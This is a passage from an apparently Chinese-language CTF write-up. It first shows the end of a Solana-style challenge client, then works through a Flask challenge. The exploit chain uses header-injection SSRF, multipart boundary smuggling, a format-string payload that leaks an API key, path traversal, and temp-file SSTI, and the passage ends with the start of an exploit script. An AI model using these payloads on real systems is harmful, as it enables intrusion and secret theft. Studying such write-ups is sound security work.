    <span class="token comment"># Wait for "num accounts: "</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        chunk <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span>errors<span class="token operator">=</span><span class="token string">'replace'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>chunk<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"num accounts: "</span> <span class="token keyword">in</span> chunk<span class="token punctuation">:</span>
            <span class="token keyword">break</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"C> Sending num accounts: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>accounts<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>accounts<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># Send accounts</span>
    <span class="token keyword">for</span> is_signer<span class="token punctuation">,</span> is_writable<span class="token punctuation">,</span> pubkey <span class="token keyword">in</span> accounts<span class="token punctuation">:</span>
        meta <span class="token operator">=</span> <span class="token string">""</span>
        <span class="token keyword">if</span> is_writable<span class="token punctuation">:</span> meta <span class="token operator">+=</span> <span class="token string">"w"</span>
        <span class="token keyword">if</span> is_signer<span class="token punctuation">:</span> meta <span class="token operator">+=</span> <span class="token string">"s"</span>
        <span class="token keyword">if</span> meta <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span> meta <span class="token operator">=</span> <span class="token string">"-"</span>  <span class="token comment"># Just something not empty</span>

        pubkey_s <span class="token operator">=</span> base58<span class="token punctuation">.</span>b58encode<span class="token punctuation">(</span>pubkey<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> pubkey_s <span class="token operator">==</span> <span class="token string">""</span><span class="token punctuation">:</span>
            pubkey_s <span class="token operator">=</span> <span class="token string">"11111111111111111111111111111111"</span>

        line <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>meta<span class="token punctuation">&#125;</span></span><span class="token string"> </span><span class="token interpolation"><span class="token punctuation">&#123;</span>pubkey_s<span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"C> Sending account: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>line<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
        s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>line<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># Wait for "ix len: "</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        chunk <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span>errors<span class="token operator">=</span><span class="token string">'replace'</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>chunk<span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"ix len: "</span> <span class="token keyword">in</span> chunk<span class="token punctuation">:</span>
            <span class="token keyword">break</span>

    <span class="token comment"># Data: global:solve</span>
    data <span class="token operator">=</span> get_sighash<span class="token punctuation">(</span><span class="token string">"global:solve"</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"C> Sending data len: </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">\n"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># Just to be safe with timing</span>
    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.1</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"C> Sending data bytes..."</span></span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>data<span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Waiting for flag..."</span><span class="token punctuation">)</span>

    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Waiting for flag..."</span><span class="token punctuation">)</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4096</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span> <span class="token keyword">break</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>errors<span class="token operator">=</span><span class="token string">'replace'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2026/01/31/AliyunCTF2026/IMG-20260201170816221.png"></p>
<hr>
<h1 id="cutter"><a href="#cutter" class="headerlink" title="cutter"></a>cutter</h1><p>要访问 &#x2F;admin，就需要先获取 API_KEY</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">API_KEY <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
HOST <span class="token operator">=</span> <span class="token string">'127.0.0.1:5000'</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/action'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">action</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ip <span class="token operator">=</span> request<span class="token punctuation">.</span>remote_addr
    <span class="token keyword">if</span> ip <span class="token operator">!=</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'only localhost'</span><span class="token punctuation">,</span> <span class="token number">403</span>

    token <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"X-Token"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> token <span class="token operator">!=</span> API_KEY<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'unauth'</span><span class="token punctuation">,</span> <span class="token number">403</span>
    
    <span class="token builtin">file</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'content'</span><span class="token punctuation">)</span>
    content <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>

    action <span class="token operator">=</span> request<span class="token punctuation">.</span>files<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"action"</span><span class="token punctuation">)</span>
    act <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>action<span class="token punctuation">.</span>stream<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> act<span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"echo"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> content<span class="token punctuation">,</span> <span class="token number">200</span>
    <span class="token keyword">elif</span> act<span class="token punctuation">[</span><span class="token string">"type"</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">"debug"</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> content<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'unkown action'</span><span class="token punctuation">,</span> <span class="token number">400</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/heartbeat'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">heartbeat</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    text <span class="token operator">=</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'text'</span><span class="token punctuation">,</span> <span class="token string">"default"</span><span class="token punctuation">)</span>
    client <span class="token operator">=</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'client'</span><span class="token punctuation">,</span> <span class="token string">"default"</span><span class="token punctuation">)</span>
    token <span class="token operator">=</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>text<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">300</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"text too large"</span><span class="token punctuation">,</span> <span class="token number">400</span>

    action <span class="token operator">=</span> json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"type"</span> <span class="token punctuation">:</span> <span class="token string">"echo"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

    form_data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">'content'</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'content'</span><span class="token punctuation">,</span> BytesIO<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'text/plain'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token string">'action'</span> <span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token string">'action'</span><span class="token punctuation">,</span> BytesIO<span class="token punctuation">(</span>action<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'text/json'</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>

    headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
        <span class="token string">"X-Token"</span> <span class="token punctuation">:</span> API_KEY<span class="token punctuation">,</span>
    <span class="token punctuation">&#125;</span>
    headers<span class="token punctuation">[</span>client<span class="token punctuation">]</span> <span class="token operator">=</span> token

    response <span class="token operator">=</span> httpx<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"http://</span><span class="token interpolation"><span class="token punctuation">&#123;</span>HOST<span class="token punctuation">&#125;</span></span><span class="token string">/action"</span></span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">,</span> files<span class="token operator">=</span>form_data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">10.0</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> response<span class="token punctuation">.</span>status_code <span class="token operator">==</span> <span class="token number">200</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> response<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token number">200</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f'action failed'</span></span><span class="token punctuation">,</span> <span class="token number">500</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>注意到 &#x2F;action 需要本地访问，且 debug 模式下使用 <code>content.format(app)</code>，这里可以打 python 格式化字符串漏洞来泄漏出 API_KEY</p>
<p>所以需要在 &#x2F;heartbeat 打一个 ssrf 到 &#x2F;action，注意到这里 <code>headers[client] = token</code> 允许我们自定义请求头然后发送 post 请求，可以本地 nc 抓一下正常发送到 &#x2F;action 的请求为：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/action</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:5000</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">*/*</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">keep-alive</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">python-httpx/0.28.1</span></span>
<span class="token header"><span class="token header-name keyword">X-Token</span><span class="token punctuation">:</span> <span class="token header-value">3cfdaad321617c9df34b8c682df97fe44838a065b8e33dd434af2a309e94b743</span></span>
<span class="token header"><span class="token header-name keyword">AAA</span><span class="token punctuation">:</span> <span class="token header-value">BBB</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">320</span></span>

--0dd69a2236f11ddb1d73140d4d5c0e39
<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="content"; filename="content"</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/plain</span></span>
<span class="token text-plain">
1
--0dd69a2236f11ddb1d73140d4d5c0e39
Content-Disposition: form-data; name="action"; filename="action"
Content-Type: text/json

&#123;"type": "echo"&#125;
--0dd69a2236f11ddb1d73140d4d5c0e39--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>那么我们需要注入一个自己的 multipart 包来覆盖 action 参数，通过构造 content 闭合 boundary 即可覆盖，然后 content 参数自身的内容还需要格式化字符串的 payload 来泄漏 API_KEY：</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/action</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">127.0.0.1:5000</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">*/*</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">keep-alive</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">python-httpx/0.28.1</span></span>
<span class="token header"><span class="token header-name keyword">X-Token</span><span class="token punctuation">:</span> <span class="token header-value">3cfdaad321617c9df34b8c682df97fe44838a065b8e33dd434af2a309e94b743</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">multipart/form-data; boundary=a</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">405</span></span>

--a
<span class="token header"><span class="token header-name keyword">Content-Disposition</span><span class="token punctuation">:</span> <span class="token header-value">form-data; name="content"; filename="content"</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">text/plain</span></span>
<span class="token text-plain">
&#123;0.view_functions[admin].__globals__[API_KEY]&#125;
--a
Content-Disposition: form-data; name="action"; filename="a.json"
Content-Type: application/json
</span><span class="token application-json">
<span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"debug"</span><span class="token punctuation">&#125;</span>
--a--

--a
Content-Disposition<span class="token operator">:</span> form-data; name=<span class="token string">"action"</span>; filename=<span class="token string">"action"</span>
Content-Type<span class="token operator">:</span> text/json

<span class="token punctuation">&#123;</span><span class="token property">"type"</span><span class="token operator">:</span> <span class="token string">"echo"</span><span class="token punctuation">&#125;</span>
--a--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2026/01/31/AliyunCTF2026/IMG-20260202144442378.png"></p>
<p>这样就能设置 Authorization 头访问 admin 了</p>
<p>&#x2F;admin 处 <code>os.path.join</code> 中 tmpl 参数可控明显可以目录穿越读取任意文件</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/admin'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    token <span class="token operator">=</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Authorization"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> token <span class="token operator">!=</span> API_KEY<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'unauth'</span><span class="token punctuation">,</span> <span class="token number">403</span>

    tmpl <span class="token operator">=</span> request<span class="token punctuation">.</span>values<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'tmpl'</span><span class="token punctuation">,</span> <span class="token string">'index.html'</span><span class="token punctuation">)</span>
    tmpl_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'./templates'</span><span class="token punctuation">,</span> tmpl<span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>tmpl_path<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'Not Found'</span><span class="token punctuation">,</span> <span class="token number">404</span>

    tmpl_content <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>tmpl_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>tmpl_content<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">200</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但是 flag 的生成方式：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>

<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-n</span> <span class="token string">"<span class="token variable">$FLAG</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
    <span class="token builtin class-name">echo</span> <span class="token string">"<span class="token variable">$FLAG</span>"</span> <span class="token operator">></span> <span class="token string">"/flag-<span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> /dev/urandom <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-dc</span> <span class="token string">'a-f0-9'</span> <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-c</span> <span class="token number">32</span><span class="token variable">)</span></span>.txt"</span>
    <span class="token builtin class-name">unset</span> FLAG
<span class="token keyword">else</span>
    <span class="token builtin class-name">echo</span> <span class="token string">"flag&#123;testflag&#125;"</span> <span class="token operator">></span> <span class="token string">"/flag-<span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> /dev/urandom <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-dc</span> <span class="token string">'a-f0-9'</span> <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-c</span> <span class="token number">32</span><span class="token variable">)</span></span>.txt"</span>
<span class="token keyword">fi</span>

<span class="token function">useradd</span> <span class="token parameter variable">-M</span> ctf

<span class="token function">su</span> ctf <span class="token parameter variable">-c</span> <span class="token string">'cd /app &amp;&amp; python app.py'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>意味着必须想办法列出目录获取 flag 路径，注意到 render_template_string 此处的 tmpl_content 可以打 ssti，需要找到一个我们能控制内容的文件进行包含，但是 flask 的日志是写在 ByteIO 的，没有文件落地</p>
<p>想起来 p 神之前在 php 中打过<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">临时文件竞争包含</a>的操作，猜测 flask 中上传文件的数据包也会写入到临时文件中，那么这个临时文件的内容我们只能通过爆破 fd 句柄来得知，也就是需要竞争读取</p>
<p>于是尝试在 &#x2F;heartbeat 上传大文件，把 ssti payload 放在最前面，然后在 &#x2F;admin 包含 fd 打 ssti</p>
<p>exp：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> re
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> threading
<span class="token keyword">import</span> time
<span class="token keyword">import</span> os

<span class="token comment"># BASE_URL = "http://127.0.0.1:25000"</span>
BASE_URL <span class="token operator">=</span> <span class="token string">"http://223.6.249.127:11350"</span>


<span class="token keyword">def</span> <span class="token function">leak_api_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[*] Leaking API_KEY..."</span><span class="token punctuation">)</span>
    boundary <span class="token operator">=</span> <span class="token string">"a"</span>
    payload <span class="token operator">=</span> <span class="token punctuation">(</span>
        <span class="token string-interpolation"><span class="token string">f"&#123;&#123;0.view_functions[admin].__globals__[API_KEY]&#125;&#125;\r\n"</span></span>
        <span class="token string-interpolation"><span class="token string">f"--</span><span class="token interpolation"><span class="token punctuation">&#123;</span>boundary<span class="token punctuation">&#125;</span></span><span class="token string">\r\n"</span></span>
        <span class="token string-interpolation"><span class="token string">f'Content-Disposition: form-data; name="action"; filename="a.json"\r\n'</span></span>
        <span class="token string-interpolation"><span class="token string">f"Content-Type: application/json\r\n\r\n"</span></span>
        <span class="token string-interpolation"><span class="token string">f'&#123;&#123;"type": "debug"&#125;&#125;\r\n'</span></span>
        <span class="token string-interpolation"><span class="token string">f"--</span><span class="token interpolation"><span class="token punctuation">&#123;</span>boundary<span class="token punctuation">&#125;</span></span><span class="token string">--\r\n"</span></span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">300</span><span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[-] Payload too long"</span><span class="token punctuation">)</span>
        sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

    <span class="token keyword">try</span><span class="token punctuation">:</span>
        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>BASE_URL<span class="token punctuation">&#125;</span></span><span class="token string">/heartbeat"</span></span><span class="token punctuation">,</span>
                          data<span class="token operator">=</span><span class="token punctuation">&#123;</span>
                              <span class="token string">"text"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>
                              <span class="token string">"client"</span><span class="token punctuation">:</span> <span class="token string">"Content-Type"</span><span class="token punctuation">,</span>
                              <span class="token string">"token"</span><span class="token punctuation">:</span>
                              <span class="token string-interpolation"><span class="token string">f"multipart/form-data; boundary=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>boundary<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>
                          <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
                          timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
